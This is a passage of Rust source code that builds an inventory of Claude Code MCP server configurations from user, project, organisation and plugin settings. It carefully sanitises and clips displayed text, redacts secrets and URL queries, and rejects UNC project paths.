//! Builds the server list from `.claude.json`, project `.mcp.json` files and Claude's health caches.
//! Everything read here is untrusted: sizes are limited, text is sanitised and secrets are never shown.
use super::docstore::LEGACY;
use super::{ConfigPaths, fsx, managed, plugins, policy};
use crate::api::{
    Approval, LegacyDisabled, OAuthInfo, PluginInfo, Scope, ServerId, ServerRow, Snapshot, Status,
    TransportKind,
};
use crate::model::ConnectionId;
use crate::sanitize::{self, sanitize};
use serde::Deserialize;
use serde::de::{Error as _, MapAccess, Visitor};
use serde_json::Value;
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::fmt;
use std::path::Path;

pub(crate) const MAX_CLAUDE_JSON: u64 = 64 * 1024 * 1024;
const MAX_CACHE_JSON: u64 = 4 * 1024 * 1024;
pub(crate) const MAX_MCP_JSON: u64 = 1024 * 1024;
const MAX_MCP_SERVERS: usize = 500;
const MAX_TEXT_CHARS: usize = sanitize::MAX_SHOWN_CHARS;

/// A server's project key and name exactly as the file spells them, before they are cleaned and cut for display:
/// what every write and every `claude mcp get` uses. Kept in core; the snapshot the UI holds has only the cleaned
/// text, and tells servers apart by their opaque [`ConnectionId`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FileKey {
    pub project: Option<String>,
    pub name: String,
    /// The definition's fingerprint ([`fingerprint`]): it differs once the server was edited.
    pub definition: u64,
}

/// A fingerprint of a server's definition as the file has it, telling an edited server from the one it was. Kept
/// instead of the definition itself, which can be large.
pub(crate) fn fingerprint(entry: &Value) -> u64 {
    use std::hash::Hasher;
    struct Feed(std::collections::hash_map::DefaultHasher);
    impl std::io::Write for Feed {
        fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
            self.0.write(bytes);
            Ok(bytes.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }
    let mut feed = Feed(std::collections::hash_map::DefaultHasher::new());
    // Serialising a `Value` into a sink that cannot fail does not fail.
    let _ = serde_json::to_writer(&mut feed, entry);
    feed.0.finish()
}

/// Every row's [`FileKey`], by its connection.
pub(crate) type FileKeys = HashMap<ConnectionId, FileKey>;

/// The snapshot, and how the files spell each of its servers.
#[derive(Default)]
pub(crate) struct Inventory {
    pub snapshot: Snapshot,
    pub keys: FileKeys,
}

/// The row `id` names, and how the file spells it.
pub(crate) fn locate<'a>(
    snapshot: &'a Snapshot,
    keys: &'a FileKeys,
    id: &ServerId,
) -> Option<(&'a ServerRow, &'a FileKey)> {
    let row = snapshot.servers.iter().find(|r| r.is(id))?;
    Some((row, keys.get(&row.connection)?))
}

pub(crate) fn load(paths: &ConfigPaths) -> Inventory {
    let text = fsx::read_limited(&paths.claude_json, MAX_CLAUDE_JSON).map_err(|e| e.to_string());
    load_text(
        paths,
        text.as_ref().map(Option::as_deref).map_err(String::clone),
    )
}

/// [`load`] with `.claude.json` already read (`Ok(None)`: it does not exist), so a caller that needs the text too
/// reads the file once.
pub(crate) fn load_text(paths: &ConfigPaths, text: Result<Option<&str>, String>) -> Inventory {
    let mut keys = FileKeys::new();
    let snapshot = build(paths, text, &mut keys);
    Inventory { snapshot, keys }
}

fn build(paths: &ConfigPaths, text: Result<Option<&str>, String>, keys: &mut FileKeys) -> Snapshot {
    let mut snap = Snapshot::default();
    let root = match text.and_then(|t| t.map(parse_claude_json).transpose()) {
        Ok(Some(v)) => v,
        // Nothing configured by hand yet, but the organisation's and the plugins' servers still load.
        Ok(None) => {
            snap.warnings.push(format!(
                "{} does not exist; no servers are configured by hand yet.",
                display_path(&paths.claude_json)
            ));
            Value::Object(serde_json::Map::new())
        }
        Err(e) => {
            snap.warnings.push(format!(
                "Could not read {}: {e}",
                display_path(&paths.claude_json)
            ));
            return snap;
        }
    };
    let Some(root) = root.as_object() else {
        snap.warnings.push(format!(
            "{} is not a JSON object.",
            display_path(&paths.claude_json)
        ));
        return snap;
    };

    let hints = Hints::load(paths, &mut snap.warnings);

    // What the organisation sets (decision 009): its servers come before every other of the same name, and with
    // `managed-mcp.json` they are the only ones Claude Code loads.
    let mut managed_warnings = Vec::new();
    let org = managed::load(paths, &mut managed_warnings);
    snap.organisation_notes = managed_warnings
        .iter()
        .map(|w| {
            format!(
                "{} Your administrator can change this.",
                sanitize::sanitize_line(w)
            )
        })
        .collect();
    let only = org.only.as_deref().map(display_path);
    snap.organisation_only.clone_from(&only);
    let replaced_by = |name: &str| -> Option<String> {
        if let Some(only) = &only {
            return Some(format!(
                "Your organisation's {only} decides which servers Claude Code loads, and this one is not among them."
            ));
        }
        org.servers.iter().find(|s| s.name == name).map(|s| {
            format!(
                "Your organisation sets a server of the same name in {}, which Claude Code loads instead.",
                display_path(&s.file)
            )
        })
    };

    let projects = merged_projects(root);
    snap.project_count = projects.len();
    snap.projects = projects.keys().cloned().collect();
    // The on/off toggle is a list of names in each project's entry (decision 002).
    let disabled_by_project: BTreeMap<&String, BTreeSet<String>> = projects
        .iter()
        .map(|(key, project)| {
            let names = string_set(project.values.iter().map(|v| v.get("disabledMcpServers")));
            (key, names)
        })
        .collect();
    snap.legacy_disabled = projects
        .iter()
        .filter_map(|(key, project)| legacy_disabled(key, project, &disabled_by_project[key]))
        .collect();

    // The projects as shown, in the inventory's order.
    let shown_projects: Vec<String> = projects
        .values()
        .map(|p| clip(&sanitize(&p.display)))
        .collect();
    // The servers configured by hand or by the organisation, where each is loaded: a plugin's server that repeats
    // one is left out.
    let mut by_hand: Vec<ByHand> = Vec::new();

    // Policy (decision 010), per place: outside every project (0), then each project in the inventory's order.
    let raw_projects: Vec<&str> = projects.values().map(|p| p.raw.as_str()).collect();
    let mut policy_warnings = Vec::new();
    let policy = policy::load(paths, &raw_projects, &mut policy_warnings);
    add_warnings(&mut snap, policy_warnings);
    let all_places: Vec<usize> = (0..=projects.len()).collect();
    // User rows and where policy holds each back, judged once shadowing is known.
    let mut user_blocked: Vec<(usize, Vec<(usize, String)>)> = Vec::new();

    // User rows by name as the file spells it, to mark the projects where a closer scope hides them.
    let mut user_rows: HashMap<&str, usize> = HashMap::new();
    if let Some(servers) = root.get("mcpServers").and_then(Value::as_object) {
        for (name, entry) in servers {
            let not_loaded = replaced_by(name);
            let blocked = match &not_loaded {
                None => blocked_at(&policy, &all_places, name, entry, false),
                Some(_) => Vec::new(),
            };
            if let (None, Some(key)) = (&not_loaded, plugins::same_as_key(entry)) {
                by_hand.push(ByHand {
                    key,
                    name: name.clone(),
                    project: None,
                    blocked: blocked.iter().map(|b| b.0).collect(),
                    off_in: disabled_by_project
                        .values()
                        .zip(&shown_projects)
                        .filter(|(d, _)| d.contains(name))
                        .map(|(_, p)| p.clone())
                        .collect(),
                });
            }
            user_rows.insert(name, snap.servers.len());
            user_blocked.push((snap.servers.len(), blocked));
            let (status, cached) = hints.status_of(name);
            let mut r = row(name, entry, Scope::User, None, true, status);
            r.status_cached = cached;
            r.not_loaded = not_loaded;
            keys.insert(
                r.connection.clone(),
                FileKey {
                    project: None,
                    name: name.clone(),
                    definition: fingerprint(entry),
                },
            );
            r.disabled_in = disabled_by_project
                .values()
                .filter(|d| d.contains(name))
                .count();
            // A user server is one row, but the toggle is per project: it only counts as off when it is off
            // everywhere Claude knows about.
            r.enabled = !(snap.project_count > 0 && r.disabled_in == snap.project_count);
            snap.servers.push(r);
        }
    }

    for (index, (key, project)) in projects.iter().enumerate() {
        let place = index + 1;
        let disabled = &disabled_by_project[key];
        let mut seen_local = BTreeSet::new();
        // The user rows that a local or approved project server of this project replaces. A name that is off here
        // hides nothing: the toggle goes by name, so nothing of that name runs here at all.
        let mut hidden = BTreeSet::new();
        for (value, key) in project.values.iter().zip(&project.keys) {
            let Some(servers) = value.get("mcpServers").and_then(Value::as_object) else {
                continue;
            };
            for (name, entry) in servers {
                if seen_local.insert(name.clone()) {
                    let not_loaded = replaced_by(name).or_else(|| {
                        blocked_at(&policy, &[place], name, entry, false)
                            .pop()
                            .map(|b| b.1)
                    });
                    // Names merge before policy: a blocked server still takes its name here.
                    if !disabled.contains(name) && replaced_by(name).is_none() {
                        hidden.extend(user_rows.get(name.as_str()));
                    }
                    if !disabled.contains(name)
                        && not_loaded.is_none()
                        && let Some(key) = plugins::same_as_key(entry)
                    {
                        by_hand.push(ByHand::in_project(key, name, project));
                    }
                    let mut r = row(
                        name,
                        entry,
                        Scope::Local,
                        Some(&project.display),
                        !disabled.contains(name),
                        Status::Unknown,
                    );
                    r.connection = ConnectionId::new(Scope::Local, Some(key), name);
                    r.not_loaded = not_loaded.map(|w| clip(&sanitize::sanitize_line(&w)));
                    keys.insert(
                        r.connection.clone(),
                        FileKey {
                            project: Some((*key).to_owned()),
                            name: name.clone(),
                            definition: fingerprint(entry),
                        },
                    );
                    snap.servers.push(r);
                }
            }
        }
        if !is_safe_project_path(&project.raw) {
            snap.warnings.push(format!(
                "Skipped the .mcp.json of {}: not a local absolute path.",
                sanitize(&project.display)
            ));
            mark_hidden(&mut snap, &hidden, project);
            continue;
        }
        let mcp_json = Path::new(&project.raw).join(".mcp.json");
        match read_project_servers(&mcp_json) {
            Ok(None) => {}
            Ok(Some((servers, duplicates))) => {
                for name in duplicates {
                    snap.warnings.push(format!(
                        "{} defines {:?} more than once; the last definition wins.",
                        display_path(&mcp_json),
                        sanitize(&name)
                    ));
                }
                let approvals = ApprovalLists::load(project, &mut snap.warnings);
                for (name, entry) in servers {
                    let approval = approvals.of(&name);
                    let hint = if approval == Approval::Pending {
                        Status::PendingApproval
                    } else {
                        Status::Unknown
                    };
                    let mut r = row(
                        &name,
                        &entry,
                        Scope::Project,
                        Some(&project.display),
                        !disabled.contains(&name),
                        hint,
                    );
                    r.approval = Some(approval);
                    r.connection = ConnectionId::new(Scope::Project, Some(&project.raw), &name);
                    keys.insert(
                        r.connection.clone(),
                        FileKey {
                            project: Some(project.raw.clone()),
                            name: name.clone(),
                            definition: fingerprint(&entry),
                        },
                    );
                    // Claude Code compares names as the file spells them, not as shown, and loads a project
                    // server only once it is approved.
                    r.shadowed = seen_local.contains(&name);
                    let replaced = replaced_by(&name);
                    let blocked = blocked_at(&policy, &[place], &name, &entry, false).pop();
                    if approval == Approval::Approved
                        && !disabled.contains(&name)
                        && replaced.is_none()
                    {
                        hidden.extend(user_rows.get(name.as_str()));
                        if let (None, Some(key)) = (&blocked, plugins::same_as_key(&entry)) {
                            by_hand.push(ByHand::in_project(key, &name, project));
                        }
                    }
                    r.not_loaded = replaced
                        .or(blocked.map(|b| b.1))
                        .map(|w| clip(&sanitize::sanitize_line(&w)));
                    snap.servers.push(r);
                }
            }
            Err(e) => snap
                .warnings
                .push(format!("Ignored {}: {e}", display_path(&mcp_json))),
        }
        mark_hidden(&mut snap, &hidden, project);
    }
    // Like the toggle: one row for every project, so hidden only when hidden in all of them.
    for &i in user_rows.values() {
        let r = &mut snap.servers[i];
        r.shadowed = snap.project_count > 0 && r.shadowed_in.len() == snap.project_count;
    }
    // Where a user server is the one of its name: outside every project, and each project that does not hide it.
    for (i, blocked) in user_blocked {
        let r = &mut snap.servers[i];
        let places: Vec<usize> = all_places
            .iter()
            .copied()
            .filter(|&p| p == 0 || !r.shadowed_in.contains(&shown_projects[p - 1]))
            .collect();
        let (not_loaded, partly) = verdict(&places, &blocked, &shown_projects);
        if r.not_loaded.is_none() {
            r.not_loaded = not_loaded;
        }
        r.blocked = partly;
    }

    for server in &org.servers {
        // Claude Code compares a plugin's server with the organisation's too, wherever those are on.
        if let Some(key) = plugins::same_as_key(&server.entry) {
            by_hand.push(ByHand {
                key,
                name: server.name.clone(),
                project: None,
                off_in: disabled_by_project
                    .values()
                    .zip(&shown_projects)
                    .filter(|(d, _)| d.contains(&server.name))
                    .map(|(_, p)| p.clone())
                    .collect(),
            });
        }
        let (status, cached) = hints.status_of(&server.name);
        let mut r = row(
            &server.name,
            &server.entry,
            Scope::Managed,
            None,
            true,
            status,
        );
        r.status_cached = cached;
        r.managed = Some(display_path(&server.file));
        r.disabled_in = disabled_by_project
            .values()
            .filter(|d| d.contains(&server.name))
            .count();
        r.enabled = !(snap.project_count > 0 && r.disabled_in == snap.project_count);
        let blocked = blocked_at(&policy, &all_places, &server.name, &server.entry, true);
        (r.not_loaded, r.blocked) = verdict(&all_places, &blocked, &shown_projects);
        snap.servers.push(r);
    }

    let first_plugin = snap.servers.len();
    add_plugin_servers(
        paths,
        &mut snap,
        &by_hand,
        &disabled_by_project,
        &raw_projects,
        &shown_projects,
        &policy,
    );
    for r in &mut snap.servers[first_plugin..] {
        if let Some(why) = replaced_by(&r.name) {
            r.not_loaded = Some(why);
            r.blocked = None;
        }
    }

    mark_casing_collisions(&mut snap.servers);
    snap
}

/// A server configured by hand, as a plugin's server is compared with it.
struct ByHand {
    /// [`plugins::same_as_key`] of its definition.
    key: String,
    name: String,
    /// The project (as shown) of a local or project server; `None` for a user server.
    project: Option<String>,
    /// A user server: the projects (as shown) where it is off.
    off_in: BTreeSet<String>,
    /// The places (0: outside every project, then each project) where policy holds it back.
    blocked: Vec<usize>,
}

impl ByHand {
    /// Whether Claude Code loads this server in the place `place`, `project` (`None`: outside every project).
    fn loaded_in(&self, place: usize, project: Option<&str>) -> bool {
        if self.blocked.contains(&place) {
            return false;
        }
        match (&self.project, project) {
            (None, None) => true,
            (None, Some(p)) => !self.off_in.contains(p),
            (Some(own), p) => p == Some(own.as_str()),
        }
    }

    fn in_project(key: String, name: &str, project: &Project<'_>) -> Self {
        Self {
            key,
            name: name.to_owned(),
            project: Some(clip(&sanitize(&project.display))),
            off_in: BTreeSet::new(),
            // Only added where it is loaded.
            blocked: Vec::new(),
        }
    }
}

/// Read-only rows for the servers of the plugins that are on (decision 008), after every server configured by hand.
/// Claude Code leaves a plugin's server out where a server configured by hand has the same command or address, or
/// where an earlier plugin's server does (with the same environment too): marked shadowed, naming that server.
fn add_plugin_servers(
    paths: &ConfigPaths,
    snap: &mut Snapshot,
    by_hand: &[ByHand],
    disabled_by_project: &BTreeMap<&String, BTreeSet<String>>,
    raw_projects: &[&str],
    shown_projects: &[String],
    policy: &policy::Policy,
) {
    let mut warnings = Vec::new();
    let loaded = plugins::load(paths, raw_projects, &mut warnings);
    // A project's `settings.local.json` is also read for approvals: said once.
    add_warnings(snap, warnings);
    let servers = &loaded.servers;
    // Where a server is loaded or left out: outside every project (where nothing is off), then each project.
    let off: Vec<Option<&BTreeSet<String>>> = std::iter::once(None)
        .chain(disabled_by_project.values().map(Some))
        .collect();
    let places: Vec<Option<&str>> = std::iter::once(None)
        .chain(shown_projects.iter().map(|p| Some(p.as_str())))
        .collect();
    let names: Vec<String> = servers
        .iter()
        .map(plugins::PluginServer::full_name)
        .collect();
    let runs: Vec<Value> = servers
        .iter()
        .map(plugins::PluginServer::expanded)
        .collect();
    let keys: Vec<Option<String>> = runs.iter().map(plugins::same_as_key).collect();
    let plugin_keys: Vec<Option<String>> = runs.iter().map(plugins::same_as_plugin_key).collect();
    // Per server and place: its plugin is on there; Claude Code leaves it out there.
    let mut on = vec![vec![false; places.len()]; servers.len()];
    let mut hidden = vec![vec![false; places.len()]; servers.len()];
    let mut by_hand_name: Vec<Option<&str>> = vec![None; servers.len()];
    let mut by_plugin: Vec<Option<&str>> = vec![None; servers.len()];
    // Per server: the places where policy holds it back.
    let mut blocked: Vec<Vec<(usize, String)>> = vec![Vec::new(); servers.len()];
    for (i, place) in places.iter().enumerate() {
        // Where the row says it is left out: in projects, or outside every project when Claude Code knows none. Only
        // there is the other server named, so the count and the name never disagree.
        let shown = (i == 0) == (snap.project_count == 0);
        // The plugin servers loaded here so far, by definition: the first one stays.
        let mut loaded_here: HashMap<&str, &str> = HashMap::new();
        for &s in &loaded.on[i] {
            on[s][i] = true;
            let hand = keys[s].as_ref().and_then(|key| {
                by_hand
                    .iter()
                    .find(|m| m.key == *key && m.loaded_in(i, *place))
            });
            let earlier = plugin_keys[s]
                .as_deref()
                .and_then(|k| loaded_here.get(k).copied());
            // Policy comes before the plugins are compared: a blocked one hides nothing.
            let held_back = policy.places[i].blocks(&names[s], &runs[s], false);
            if let Some(m) = hand {
                if shown {
                    by_hand_name[s].get_or_insert(&m.name);
                }
                hidden[s][i] = true;
            } else if let Some(earlier) = earlier {
                if shown {
                    by_plugin[s].get_or_insert(earlier);
                }
                hidden[s][i] = true;
            } else if let Some(why) = held_back {
                blocked[s].push((i, why));
            } else if let Some(k) = &plugin_keys[s]
                && !off[i].is_some_and(|d| d.contains(&names[s]))
            {
                loaded_here.insert(k, &names[s]);
            }
        }
    }
    for (s, server) in servers.iter().enumerate() {
        let name = &names[s];
        // Claude Code puts every plugin server in its needs-auth cache, whatever the server is: no status from it.
        let mut r = row(name, &runs[s], Scope::Plugin, None, true, Status::Unknown);
        // A plugin's command runs from the plugin's own folder (`${CLAUDE_PLUGIN_ROOT}`), not a project's.
        r.relative_paths.clear();
        r.disabled_in = disabled_by_project
            .values()
            .filter(|d| d.contains(name))
            .count();
        r.enabled = !(snap.project_count > 0 && r.disabled_in == snap.project_count);
        let same_as = by_hand_name[s].or(by_plugin[s]);
        // Left out wherever its plugin is on.
        let on_projects: Vec<usize> = (1..places.len()).filter(|&i| on[s][i]).collect();
        r.shadowed = if snap.project_count == 0 {
            hidden[s][0]
        } else {
            !on_projects.is_empty() && on_projects.iter().all(|&i| hidden[s][i])
        };
        r.shadowed_in = shown_projects
            .iter()
            .zip(&hidden[s][1..])
            .filter(|(_, h)| **h)
            .map(|(p, _)| p.clone())
            .collect();
        // Where it would load: its plugin is on there, and nothing hides it.
        let would_load: Vec<usize> = (0..places.len())
            .filter(|&i| on[s][i] && !hidden[s][i])
            .collect();
        (r.not_loaded, r.blocked) = verdict(&would_load, &blocked[s], shown_projects);
        let written = classify(&server.entry).1;
        let written_target = (written != r.target).then_some(written);
        r.plugin = Some(PluginInfo {
            plugin: clip(&sanitize::sanitize_line(&server.plugin)),
            marketplace: clip(&sanitize::sanitize_line(&server.marketplace)),
            same_as: same_as.map(|n| clip(&sanitize::sanitize_line(n))),
            written_target,
            off_in: shown_projects
                .iter()
                .zip(&on[s][1..])
                .filter(|(_, on)| !**on)
                .map(|(p, _)| p.clone())
                .collect(),
        });
        snap.servers.push(r);
    }
}

/// Adds `warnings`, cleaned, unless already there: several readers look at the same settings files.
fn add_warnings(snap: &mut Snapshot, warnings: Vec<String>) {
    for w in warnings {
        let w = sanitize::sanitize_line(&w);
        if !snap.warnings.contains(&w) {
            snap.warnings.push(w);
        }
    }
}

/// The places among `places` where policy holds the server `name`, `entry` back, and why.
fn blocked_at(
    policy: &policy::Policy,
    places: &[usize],
    name: &str,
    entry: &Value,
    organisation: bool,
) -> Vec<(usize, String)> {
    places
        .iter()
        .filter_map(|&p| {
            let why = policy.places.get(p)?.blocks(name, entry, organisation)?;
            Some((p, why))
        })
        .collect()
}

/// What a row says about policy, from the places it would load in and where policy holds it back there: not loaded
/// when held back in all of them, else the projects where it is. Counted like "left out": projects, or outside every
/// project when Claude Code knows none.
fn verdict(
    places: &[usize],
    blocked: &[(usize, String)],
    shown_projects: &[String],
) -> (Option<String>, Option<crate::api::Blocked>) {
    let counted: Vec<usize> = places
        .iter()
        .copied()
        .filter(|&p| (p == 0) == shown_projects.is_empty())
        .collect();
    let counted = if counted.is_empty() {
        places.to_vec()
    } else {
        counted
    };
    let hit: Vec<&(usize, String)> = blocked
        .iter()
        .filter(|(p, _)| counted.contains(p))
        .collect();
    let Some((_, why)) = hit.first() else {
        return (None, None);
    };
    let why = clip(&sanitize::sanitize_line(why));
    if hit.len() == counted.len() {
        return (Some(why), None);
    }
    let projects = hit
        .iter()
        .filter(|(p, _)| *p > 0)
        .map(|(p, _)| shown_projects[p - 1].clone())
        .collect();
    (None, Some(crate::api::Blocked { why, projects }))
}

/// Names `project` on the user rows at `hidden`: there, a server of the same name is loaded instead.
fn mark_hidden(snap: &mut Snapshot, hidden: &BTreeSet<usize>, project: &Project<'_>) {
    if hidden.is_empty() {
        return;
    }
    let shown = clip(&sanitize(&project.display));
    for &i in hidden {
        snap.servers[i].shadowed_in.push(shown.clone());
    }
}

/// The old toggle list of a project, from every spelling of it, when any has one.
fn legacy_disabled(
    key: &str,
    project: &Project<'_>,
    disabled: &BTreeSet<String>,
) -> Option<LegacyDisabled> {
    let lists: Vec<&Value> = project
        .values
        .iter()
        .filter_map(|v| v.get(LEGACY))
        .collect();
    if lists.is_empty() {
        return None;
    }
    let mut malformed = false;
    // In file order, once each; the set keeps a long (untrusted) list linear.
    let mut names: Vec<&str> = Vec::new();
    let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for list in lists {
        let Some(items) = list.as_array() else {
            malformed = true;
            continue;
        };
        for item in items {
            match item.as_str() {
                Some(name) if seen.insert(name) => names.push(name),
                Some(_) => {}
                None => malformed = true,
            }
        }
    }
    Some(LegacyDisabled {
        project: key.to_owned(),
        shown: clip(&sanitize(&project.display)),
        turns_off: names
            .iter()
            .filter(|n| !disabled.contains(**n))
            .map(|n| clip(&sanitize(n)))
            .collect(),
        names: names.iter().map(|n| clip(&sanitize(n))).collect(),
        malformed,
    })
}

// ---------------------------------------------------------------- rows

fn row(
    name: &str,
    entry: &Value,
    scope: Scope,
    project: Option<&str>,
    enabled: bool,
    status: Status,
) -> ServerRow {
    let (transport, target) = classify(entry);
    ServerRow {
        // From the keys as the file spells them; callers with a project set it from that project's key.
        connection: ConnectionId::new(scope, project, name),
        name: clip(&sanitize::sanitize_line(name)),
        scope,
        project: project.map(|p| clip(&sanitize(p))),
        transport,
        target,
        status,
        enabled,
        disabled_in: 0,
        approval: None,
        shadowed: false,
        shadowed_in: Vec::new(),
        casing_collision: false,
        relative_paths: super::relative::relative_paths(entry),
        status_cached: false,
        oauth: oauth_info(entry),
        plugin: None,
        managed: None,
        not_loaded: None,
        blocked: None,
    }
}

/// At most this many scopes are kept per server; more is not a configuration anyone reads.
const MAX_SCOPES: usize = 256;

/// The OAuth client id and scopes of `entry`, cleaned and cut like every other text. Only those two keys: anything
/// else under `oauth` (a client secret, say) is never read into a row. Values of the wrong kind are left out.
fn oauth_info(entry: &Value) -> Option<OAuthInfo> {
    let oauth = entry.get("oauth")?.as_object()?;
    let client_id = oauth
        .get("clientId")
        .and_then(Value::as_str)
        .map(|id| clip(&sanitize::sanitize_line(id)));
    let scopes: Vec<String> = match oauth.get("scopes") {
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(Value::as_str)
            .map(|s| clip(&sanitize::sanitize_line(s)))
            .take(MAX_SCOPES)
            .collect(),
        Some(Value::String(spaced)) => spaced
            .split_whitespace()
            .map(|s| clip(&sanitize::sanitize_line(s)))
            .take(MAX_SCOPES)
            .collect(),
        _ => Vec::new(),
    };
    Some(OAuthInfo { client_id, scopes })
}

pub(crate) fn classify(entry: &Value) -> (TransportKind, String) {
    let Some(obj) = entry.as_object() else {
        return (TransportKind::Invalid, "entry is not an object".into());
    };
    match obj.get("type").and_then(Value::as_str) {
        None | Some("stdio") => match obj.get("command").and_then(Value::as_str) {
            Some(cmd) if !cmd.trim().is_empty() => {
                // Each part cleaned on its own: an escape left open in one must not swallow the next.
                let mut line = sanitize::sanitize_line(cmd);
                // Shown in the app, and printed by `klefki-cli` into scrollback and logs: no secrets (CWE-532).
                for arg in super::secretlike::shown_args(
                    obj.get("args")
                        .and_then(Value::as_array)
                        .into_iter()
                        .flatten()
                        .filter_map(Value::as_str),
                ) {
                    line.push(' ');
                    line.push_str(&sanitize::sanitize_line(&arg));
                }
                (TransportKind::Stdio, clip(&line))
            }
            _ => (TransportKind::Invalid, "missing command".into()),
        },
        Some(kind @ ("http" | "sse" | "ws")) => {
            let (transport, schemes): (_, &[&str]) = match kind {
                "http" => (TransportKind::Http, &["http", "https"]),
                "sse" => (TransportKind::Sse, &["http", "https"]),
                _ => (TransportKind::Ws, &["ws", "wss"]),
            };
            match obj.get("url").and_then(Value::as_str) {
                Some(url) => match display_url(url, schemes) {
                    Ok(shown) => (transport, shown),
                    Err(why) => (TransportKind::Invalid, why.into()),
                },
                None => (TransportKind::Invalid, "missing url".into()),
            }
        }
        Some(other) => (
            TransportKind::Invalid,
            clip(&format!("unknown type {:?}", sanitize(other))),
        ),
    }
}

/// A URL for display: no credentials and no query string, which may carry tokens.
pub(crate) fn display_url(raw: &str, schemes: &[&str]) -> Result<String, &'static str> {
    let url = url::Url::parse(raw.trim()).map_err(|_| "invalid URL")?;
    if !schemes.contains(&url.scheme()) {
        return Err("URL scheme is not allowed for this type");
    }
    let host = url
        .host_str()
        .filter(|h| !h.is_empty())
        .ok_or("URL has no host")?;
    let mut shown = format!("{}://{host}", url.scheme());
    if let Some(port) = url.port() {
        shown.push_str(&format!(":{port}"));
    }
    shown.push_str(url.path());
    if url.query().is_some() {
        shown.push_str("?…");
    }
    Ok(clip(&sanitize(&shown)))
}

fn clip(s: &str) -> String {
    sanitize::clip(s, MAX_TEXT_CHARS)
}

fn mark_casing_collisions(rows: &mut [ServerRow]) {
    // Claude resolves one effective set per project: user + that project's local + project servers.
    let user: Vec<usize> = (0..rows.len())
        .filter(|&i| rows[i].scope == Scope::User)
        .collect();
    let mut per_project: BTreeMap<String, Vec<usize>> = BTreeMap::new();
    for (i, r) in rows.iter().enumerate() {
        if let (false, Some(p)) = (r.scope == Scope::User, &r.project) {
            per_project.entry(normalise_project(p)).or_default().push(i);
        }
    }
    let mut sets = vec![user.clone()];
    for mut set in per_project.into_values() {
        set.extend(&user);
        sets.push(set);
    }
    // Each name is lower-cased once; user rows take part in every project's set.
    let lower: Vec<String> = rows.iter().map(|r| r.name.to_lowercase()).collect();
    let mut flagged = BTreeSet::new();
    for set in &sets {
        let mut by_lower: BTreeMap<&str, Vec<usize>> = BTreeMap::new();
        for &i in set {
            by_lower.entry(lower[i].as_str()).or_default().push(i);
        }
        for group in by_lower.values() {
            let spellings: BTreeSet<&str> = group.iter().map(|&i| rows[i].name.as_str()).collect();
            if spellings.len() > 1 {
                flagged.extend(group.iter().copied());
            }
        }
    }
    for i in flagged {
        rows[i].casing_collision = true;
    }
}

// ---------------------------------------------------------------- projects

struct Project<'a> {
    /// Path spelling used for reading `.mcp.json`.
    raw: String,
    display: String,
    values: Vec<&'a Value>,
    /// The spelling of the key each of `values` is filed under, for the ids of the servers in it.
    keys: Vec<&'a str>,
}

/// Claude may record one directory under several spellings (`c:\x`, `C:/x/`); merge them.
fn merged_projects(root: &serde_json::Map<String, Value>) -> BTreeMap<String, Project<'_>> {
    let mut out: BTreeMap<String, Project<'_>> = BTreeMap::new();
    let Some(projects) = root.get("projects").and_then(Value::as_object) else {
        return out;
    };
    for (path, value) in projects {
        if !value.is_object() {
            continue;
        }
        out.entry(normalise_project(path))
            .or_insert_with(|| Project {
                raw: path.clone(),
                display: normalise_project(path),
                values: Vec::new(),
                keys: Vec::new(),
            });
        let project = out
            .get_mut(&normalise_project(path))
            .expect("just inserted");
        project.values.push(value);
        project.keys.push(path);
    }
    out
}

/// [`normalise_project`] without a copy when the path is already spelled that way, as it mostly is.
pub(crate) fn project_key(path: &str) -> std::borrow::Cow<'_, str> {
    let b = path.as_bytes();
    let normal = !path.contains('\\')
        && !(b.len() > 1 && b.ends_with(b"/") && !path.ends_with(":/"))
        && !(b.len() >= 2 && b[0].is_ascii_lowercase() && b[1] == b':');
    if normal {
        std::borrow::Cow::Borrowed(path)
    } else {
        std::borrow::Cow::Owned(normalise_project(path))
    }
}

pub(crate) fn normalise_project(path: &str) -> String {
    let mut p = path.replace('\\', "/");
    while p.len() > 1 && p.ends_with('/') && !p.ends_with(":/") {
        p.pop();
    }
    let bytes = p.as_bytes();
    if bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
        p[..1].make_ascii_uppercase();
    }
    p
}

/// Only local absolute paths are opened. UNC paths would make Windows contact (and authenticate to) a remote host;
/// Windows takes either slash in their `\\server` prefix (`/\server`, `\/server`).
pub(crate) fn is_safe_project_path(path: &str) -> bool {
    let two_slashes = path
        .as_bytes()
        .get(..2)
        .is_some_and(|start| start.iter().all(|&b| b == b'/' || b == b'\\'));
    !(two_slashes || path.contains('\0')) && Path::new(path).is_absolute()
}

/// The definition of one server, read fresh: a user server (`project` `None`), a local server (`project` in any
/// spelling), or with `in_repository`, a project server from that project's `.mcp.json`.
pub(crate) fn server_entry(
    paths: &ConfigPaths,
    project: Option<&str>,
    name: &str,
    in_repository: bool,
) -> Result<Value, String> {
    if in_repository {
        let project = project.ok_or("a project server needs its project")?;
        return project_server(project, name);
    }
    let text = fsx::read_limited(&paths.claude_json, MAX_CLAUDE_JSON)
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("{} does not exist", display_path(&paths.claude_json)))?;
    let root = parse_claude_json(&text)?;
    entry_in(&root, project, name)
        .ok_or_else(|| "the server is no longer in the configuration".to_owned())
}

/// The definitions of several servers, as [`server_entry`] reads each one, with every file read once: `.claude.json`
/// for user and local servers, and each project's `.mcp.json` for its project servers (`in_repository`).
pub(crate) fn server_entries(
    paths: &ConfigPaths,
    wanted: &[(&FileKey, bool)],
) -> Vec<Result<Value, String>> {
    let root = wanted
        .iter()
        .any(|(_, in_repository)| !in_repository)
        .then(|| {
            fsx::read_limited(&paths.claude_json, MAX_CLAUDE_JSON)
                .map_err(|e| e.to_string())?
                .ok_or_else(|| format!("{} does not exist", display_path(&paths.claude_json)))
                .and_then(|text| parse_claude_json(&text))
        });
    // Each project's servers, read once.
    let mut repositories: HashMap<&str, Result<ProjectServerList, String>> = HashMap::new();
    wanted
        .iter()
        .map(|(key, in_repository)| {
            let gone = || "the server is no longer in the configuration".to_owned();
            if *in_repository {
                let project = key
                    .project
                    .as_deref()
                    .ok_or("a project server needs its project")?;
                let servers = repositories.entry(project).or_insert_with(|| {
                    if !is_safe_project_path(project) {
